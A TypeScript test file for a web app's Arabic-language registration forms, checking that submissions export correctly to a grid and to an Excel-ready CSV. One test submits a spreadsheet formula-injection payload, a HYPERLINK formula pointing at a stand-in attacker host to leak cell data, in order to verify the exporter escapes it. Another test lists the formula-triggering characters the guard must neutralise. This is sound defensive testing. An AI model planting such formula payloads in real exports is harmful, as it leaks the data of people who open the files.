import test from "node:test";
import assert from "node:assert/strict";
import { useTempDataDir } from "./helpers/data-dir.ts";

useTempDataDir();

let seq = 0;

async function cohort() {
  const { createGroup } = await import("@/app/lib/db");
  const { createForm } = await import("@/app/lib/forms/store");
  seq += 1;
  const group = createGroup(`clean ${seq}/10`);
  return { group, form: createForm({ name: `تسجيل ${seq}`, groupId: group.id, fromTemplate: true }) };
}

/** The Clean template asks about illnesses twice, so the one meant is named by id. */
async function register(
  formToken: string,
  formId: number,
  name: string,
  phone: string,
  special?: { fieldId: number; value: string }
) {
  const { listFields, submitForm } = await import("@/app/lib/forms/store");
  const answers: Record<string, string> = {};
  for (const field of listFields(formId)) {
    answers[String(field.id)] =
      field.id === special?.fieldId
        ? special.value
        : field.mapsTo === "name"
          ? name
          : field.mapsTo === "phone"
            ? phone
            : field.kind === "signature"
              ? "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=="
              : field.options[0] ?? "نعم";
  }
  return submitForm(formToken, answers);
}

async function illnessField(formId: number) {
  const { listFields } = await import("@/app/lib/forms/store");
  return listFields(formId).find((field) => field.label.includes("أمراض"))!;
}

test("the cohort's registrations come out as one table, a row each", async () => {
  const { submissionGrid } = await import("@/app/lib/forms/report");
  const { listFields } = await import("@/app/lib/forms/store");
  const { group, form } = await cohort();

  const illness = await illnessField(form.id);
  await register(form.token, form.id, "ليلى عوض", "0521110001", { fieldId: illness.id, value: "سكري" });
  await register(form.token, form.id, "مريم حسارمة", "0521110002", { fieldId: illness.id, value: "ضغط" });

  const grid = submissionGrid(form.id)!;
  assert.equal(grid.groupName, group.name);
  assert.equal(grid.rows.length, 2);
  assert.deepEqual(grid.columns, listFields(form.id).map((field) => field.label), "the questions, in the form's order");

  const column = grid.columns.indexOf(illness.label);
  assert.deepEqual(grid.rows.map((row) => row.cells[column]), ["سكري", "ضغط"], "oldest first, like a register");
});

test("a signature is reported as present, not pasted into the cell", async () => {
  const { submissionGrid, gridToCsv } = await import("@/app/lib/forms/report");
  const { form } = await cohort();
  await register(form.token, form.id, "موقّعة", "0521110003");

  const grid = submissionGrid(form.id)!;
  const csv = gridToCsv(grid);

  assert.ok(!csv.includes("base64"), "a few thousand characters of base64 is not a table cell");
  assert.ok(grid.rows[0].cells.includes("موقّع"));
});

test("a question the form stopped asking keeps its answers and its column", async () => {
  const { submissionGrid } = await import("@/app/lib/forms/report");
  const { listFields, archiveField } = await import("@/app/lib/forms/store");
  const { form } = await cohort();

  const illness = await illnessField(form.id);
  await register(form.token, form.id, "قديمة", "0521110004", { fieldId: illness.id, value: "سكري" });

  archiveField(illness.id);

  // Someone registering now is not asked it at all.
  const second = await register(form.token, form.id, "جديدة", "0521110005");
  assert.equal(second.ok, true, JSON.stringify(second));
  assert.ok(
    !listFields(form.id).some((field) => field.id === illness.id),
    "an archived question is not put to anyone"
  );

  const grid = submissionGrid(form.id)!;
  assert.ok(grid.columns.includes(illness.label), "the column survives the question being removed");

  const index = grid.columns.indexOf(illness.label);
  assert.equal(grid.rows[0].cells[index], "سكري", "what she said is still there");
  assert.equal(grid.rows[1].cells[index], "", "and the one never asked is simply blank");
});

test("the file Excel opens is UTF-8 with a BOM and one row per registration", async () => {
  const { submissionGrid, gridToCsv } = await import("@/app/lib/forms/report");
  const { form } = await cohort();

  const illness = await illnessField(form.id);
  await register(form.token, form.id, "ليلى عوض", "0521110006", { fieldId: illness.id, value: "سكري" });
  await register(form.token, form.id, 'مريم "أبو" حسارمة', "0521110007", { fieldId: illness.id, value: "ضغط، سكري" });

  const csv = gridToCsv(submissionGrid(form.id)!);

  assert.ok(csv.startsWith("﻿"), "without the BOM Excel reads Arabic as mojibake");
  assert.equal(csv.trimEnd().split("\r\n").length, 3, "a header and two registrations");
  assert.ok(csv.includes('"مريم ""أبو"" حسارمة"'), "a quote in a name is escaped, not ended");
  assert.ok(csv.includes('"ضغط، سكري"'), "an Arabic comma inside a cell does not split it");
});

test("the table can be narrowed to the ones already in the group", async () => {
  const { submissionGrid } = await import("@/app/lib/forms/report");
  const { listSubmissions } = await import("@/app/lib/forms/store");
  const { approveSubmission } = await import("@/app/lib/forms/approve");
  const { form } = await cohort();

  await register(form.token, form.id, "انضمّت", "0521110008");
  await register(form.token, form.id, "بانتظار", "0521110009");

  approveSubmission(listSubmissions({ formId: form.id })[1].id);

  assert.equal(submissionGrid(form.id)!.rows.length, 2);
  assert.equal(submissionGrid(form.id, { state: "added" })!.rows.length, 1);
  assert.equal(submissionGrid(form.id, { state: "new" })!.rows.length, 1);
});

test("a formula typed into the public form is text by the time Excel sees it", async () => {
  const { submissionGrid, gridToCsv } = await import("@/app/lib/forms/report");
  const { listFields } = await import("@/app/lib/forms/store");
  const { form } = await cohort();

  // Anyone with the link can type this into a question.
  const town = listFields(form.id).find((field) => field.mapsTo === "city")!;
  await register(form.token, form.id, "مهاجِمة", "0521110010", {
    fieldId: town.id,
    value: '=HYPERLINK("http://evil.test?x="&A1,"اضغط")'
  });

  const csv = gridToCsv(submissionGrid(form.id)!);
  const cell = csv.split("\r\n")[1].split('","').find((part) => part.includes("HYPERLINK"))!;

  assert.ok(cell.startsWith("'="), `the cell is marked as text — got ${cell.slice(0, 20)}`);
  assert.ok(!csv.includes('"=HYPERLINK'), "no cell opens with = where Excel would run it");
});

test("the same guard for every opener Excel treats as a formula", async () => {
  const { gridToCsv } = await import("@/app/lib/forms/report");

  const grid = {
    formId: 1,
    formName: "x",
    groupName: "y",
    columns: ["س"],
    rows: ["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "عادي", "+972521234567"].map((value, index) => ({
      submissionId: index,
      memberId: null,
      state: "new",
      submittedAt: "2026-10-11 10:00",
      cells: [value]
    }))
  };

  const lines = gridToCsv(grid).trimEnd().split("\r\n").slice(1);
  for (const line of lines.slice(0, 5)) {
    assert.ok(line.includes(`"'`), `an opener slipped through: ${line}`);
  }
  assert.ok(lines[5].endsWith('"عادي"'), "ordinary text is left alone");
  assert.ok(lines[6].includes(`"'+972521234567"`), "a phone is neutralised too, and Excel still shows it whole");
});
